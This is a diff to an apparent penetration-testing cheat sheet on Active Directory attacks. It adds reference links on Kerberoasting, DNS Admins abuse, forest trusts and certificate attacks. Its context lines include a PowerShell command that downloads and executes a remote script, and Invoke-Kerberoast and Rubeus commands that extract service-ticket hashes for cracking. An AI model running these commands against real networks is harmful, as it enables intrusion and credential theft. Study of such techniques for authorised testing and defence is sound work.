@@ -509,6 +509,7 @@ iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 ```Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII Output_TGSs```
 
 #### Rubeus
+https://blog.harmj0y.net/redteaming/kerberoasting-revisited/
 
 ```.\Rubeus.exe kerberoast```
 
@@ -666,3 +667,14 @@ klist
 * * *
 
 # Constrained Delegation
+# DNS Admins
+https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
+
+# MS SQL
+# Forests and Trusts?
+https://blog.harmj0y.net/redteaming/not-a-security-boundary-breaking-forest-trusts/
+https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d
+https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1
+
+#Certificates
+https://blog.harmj0y.net/activedirectory/certified-pre-owned/
